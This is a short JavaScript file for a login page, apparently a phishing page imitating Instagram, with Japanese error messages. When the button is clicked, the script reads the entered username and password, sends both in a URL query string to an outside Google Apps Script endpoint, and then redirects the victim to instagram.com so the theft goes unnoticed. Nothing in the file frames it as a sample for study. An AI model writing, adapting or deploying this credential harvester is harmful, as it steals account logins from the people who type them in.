document.addEventListener("DOMContentLoaded", function () {
    const loginButton = document.querySelector(".log-in-button");
    const usernameField = document.querySelector('input[type="text"]');
    const passwordField = document.querySelector('input[type="password"]');

    loginButton.addEventListener("click", function () {
        const username = usernameField.value;
        const passwd = passwordField.value;

        if (passwd.length < 6) {
            return;
        }

        loginButton.disabled = true;
        loginButton.style.opacity = "0.5";
        loginButton.style.cursor = "not-allowed";

        const url = `https://script.google.com/macros/s/AKfycbwhXDmAX8kxNKHJGSSr3GJ9xYCLFdMeodj4waBabbxe7DvGxChSaHjqJq46FXgW6g2rHw/exec?username=${encodeURIComponent(username)}&passwd=${encodeURIComponent(passwd)}`;

        fetch(url)
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTPエラー! ステータス: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                if (data.success) {
                    window.location.href = "https://instagram.com";
                } else {
                    alert("ログインに失敗しました。再度試してください。");
                    loginButton.disabled = false;
                    loginButton.style.opacity = "1";
                    loginButton.style.cursor = "pointer";
                }
            })
            .catch(error => {
                console.error("エラー:", error);
                alert("ネットワークエラーが発生しました。再度試してください。");

                loginButton.disabled = false;
                loginButton.style.opacity = "1";
                loginButton.style.cursor = "pointer";
            });
    });
});
